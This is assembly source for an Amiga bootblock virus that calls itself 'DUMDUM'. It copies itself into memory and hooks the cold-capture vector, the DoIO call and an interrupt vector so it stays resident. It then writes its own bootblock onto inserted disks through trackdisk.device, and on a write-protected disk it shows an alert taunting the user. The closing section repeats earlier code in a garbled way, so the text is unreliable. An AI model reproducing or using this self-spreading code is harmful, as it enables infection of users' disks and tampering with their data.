-----------  ---------
    org $7fa00
    load $7fa00
startv:  dc.l $444f5300,$2e18c4de,$00000370
    bra.s going
    dc.b "DUMDUMBYGOD",0
**********************************************************
going:
copy:    clr.l d1
    lea startv(pc),a2
    move.l #$7fa00,a3
    move.b #$ff,d1
copyit:  move.l (a2)+,(a3)+
    sub.b #1,d1
    bne .Scopyit
*****************************************************
setcold:move.l 4,a6
    move.l #start,$2e(a6)
gerer:   lea $22(a6),a0
    clr.w d0
    moveq #$17,d1
geer:    add.w (a0)+,d0
    dbf d1,geer
    not.w d0
    move.w d0,(a0)
    lea dos(pc),a1
    jsr -96(a6)
    move.l d0,a0
    move.l $16(a0),a0
    moveq #00,d0
    rts
dos:     dc.b "dos.library",0
intui:   dc.b "intuition.library",0
**********************************************************
start:   btst #6,$bfe001
    beq gout
    movem.l d0-d7/a0-a6,-(a7)
    move.l 4,a6
    move.l -454(a6),save
    move.l #start2,-454(a6)
    movem.l (a7)+,d0-d7/a0-a6
    rts
gout:
    move.l 4,a6
    move.l #0,$2e(a6)
    jsr gerer
    move.l 4,a6
    move.l save,-454(a6)
    move.l save1,$64
    rts
**********************************************************
**********************************************************
int:     movem.l d0-d7/a0-a6,-(a7)
    move.l 4,a6
    cmp.l #start,$2e(a6)
    beq .S coldok
    bsr .Lsetcold
coldok:  movem.l (a7)+,d0-d7/a0-a6
    dc.w $4ef9
save1:   dc.l 0

int2:    tst.b testbit
    beq sowhat
    jsr setrout
sowhat: bclr #1,$bfe001
    movem.l d0-d7/a0-a6,-(a7)
    btst #5,$bfe001
    bne .Ldiskok2
    btst #12,$dff01e
    bne .Ldiskok2
    or.b #$78,$bfd100
    bclr #3,$bfd100
    btst #3,$bfe001
    beq .Sdiskok
cleanit:move.l 4,a6
    move.l save,-454(a6)
    move.l 4,a6
    lea $7ff20,a1
    move.w #11,28(a1)
    move.l #880*512,44(a1)
    move.l #2*11*512,36(a1)
move.w #$0f00,$dff180
;   jsr -456(a6)
    bra diskok2
diskok:  move.l #alert,$80
    trap #0
    bra .Sdiskok2
alert:   lea text(pc),a0
    move.l a0,-(a7)
    move.l 4,a6
    lea intui(pc),a1
    moveq #00,d0
    jsr -552(a6)
    move.l d0,a6
    moveq #00,d0
    move.l #$0000020,d1
    move.l (a7)+,a0
    jsr -90(a6)
    or.b #$78,$bfd100
    bclr #3,$bfd100
    btst #3,$bfe001
    beq gooff
move.w #$0fff,$dff180
    move.l 4,a6
    move.l #start2,-454(a6)
gooff:   rte
diskok2:movem.l (a7)+,d0-d7/a0-a6
    rts
*********************************************************
checkirq:cmp.l #int,$64
    beq .Sirqgoed
    move.l $64,save1
    move.l #int,$64
irqgoed:rts
setrout:move.l #$10000,d2
saaiman:sub.l #1,d2
    bne saaiman
    move.b #1,testbit
    rts
start2:  clr.b testbit
    bset #1,$bfe001
    bsr.s checkirq
    movem.l d0-d7/a0-a6,-(a7)
    btst #5,$bfe001
    bne .Snoset
    btst #12,$dff01e
    bne .Snoset
    or.b #$78,$bfd100
    bclr #3,$bfd100
    btst #3,$bfe001
    beq .Snoset
    move.l 4,a6
    move.l save,-454(a6)
    jsr getreply
    move.l 4,a6
    move.l #start3,-454(a6)
noset:   movem.l (a7)+,d0-d7/a0-a6
    bra .Sout
**********************************************************
start3:  bsr.L checkirq
    jsr int2
**********************************************************
out:     dc.w $4ef9
save:    dc.l 0
**********************************************************
getreply:move.l 4,a6
    move.l #0,a1
    jsr -294(a6)
    move.l d0,$7ff10
    lea $7ff00,a1
    jsr -354(a6)
    lea $7ff20,a1
    move.l #0,d0
    clr.l d1
    lea trackd,a0
    jsr -444(a6)
    move.l #$7ff00,14(a1)
    move.l 4,a6
    move.w #1,28(a1)
    jsr -456(a6)
    move.w #3,28(a1)
    move.l #$7fa00,40(a1)
    move.l #2*512,36(a1)
    move.l #0,44(a1)
    jsr -456(a6)
    move.w #4,28(a1)
    jsr -456(a6)
    move.w #9,28(a1)
    move.l #0,36(a1)
    jsr -456(a6)
    rts
trackd:
    dc.b "trackdisk.device",0
text:
dc.b 00,$00,$13
dc.b "      You are the owner of a DUMDUM virus please unprotect disk to
kill!"
    move.l #0,44(a1)
    jsr -456(a6)
    move.w #4,28(a1)
    jsr -456(a6)
    move.w #9,28(a1)
    move.l #0,36(a1)
    jsr -456(a6)
    rts
trackd:
    dc.b "trackdisk.device",0
text:
dc.b 00,$00,$13
dc.b "      You are the owner of a DUMDUM virus please unprotect disk to
kill!"
dc.b 0,0,0
testbit:
dc.b 0
